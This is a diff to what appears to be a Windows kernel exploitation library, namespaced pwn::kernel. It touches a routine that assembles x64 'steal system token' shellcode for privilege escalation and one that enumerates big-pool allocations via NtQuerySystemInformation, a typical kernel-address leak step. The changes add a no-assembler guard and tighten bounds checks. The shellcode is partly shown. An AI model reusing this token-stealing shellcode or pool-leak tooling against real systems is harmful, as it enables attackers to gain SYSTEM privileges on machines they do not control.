@@ -44,8 +44,12 @@ namespace pwn::kernel
 	{
 		namespace
 		{
+
 			std::vector<BYTE> __steal_system_token_x64(void)
 			{
+#ifdef PWN_NO_ASSEMBLER
+                throw std::exception("This library wasn't compiled with assembly support");
+#else
 				const char* sc = ""
 					"push rax ;"
 					"push rbx ;"
@@ -72,11 +76,13 @@ namespace pwn::kernel
 					"add rsp, 0x28 ;"
 					"xor rax, rax ;"
 					"ret ;";
+
 				const size_t sclen = ::strlen(sc);
 				std::vector<BYTE> out;
 				if (!pwn::assm::x64(sc, sclen, out))
 					throw std::runtime_error("failed to compile shellcode\n");
 				return out;
+#endif
 			}
 		}
 
@@ -269,15 +275,15 @@ namespace pwn::kernel
 
 		SIZE_T BufferLength;
 		auto Buffer = query_system_info(SystemBigPoolInformation, &BufferLength);
-		if (!Buffer)
+        if (!Buffer || BufferLength < 8)
 		{
 			throw new std::runtime_error("NtQuerySystemInformation()");
 		}
 
-		auto PoolTableSize = (BufferLength - 8) / sizeof(BIG_POOL_INFO);
-		auto PoolTableInfo = reinterpret_cast<PBIG_POOL_INFO>(Buffer.get() + 8);
+		u32 PoolTableSize = (BufferLength - 8) / sizeof(BIG_POOL_INFO);
+        PBIG_POOL_INFO PoolTableInfo = reinterpret_cast<PBIG_POOL_INFO>(Buffer.get() + 8);
 
-		for (auto i = 0; i < PoolTableSize; i++)
+		for (u32 i = 0; i < PoolTableSize; i++)
 		{
 			auto PoolInfo = reinterpret_cast<PBIG_POOL_INFO>(&PoolTableInfo[i]);
 			
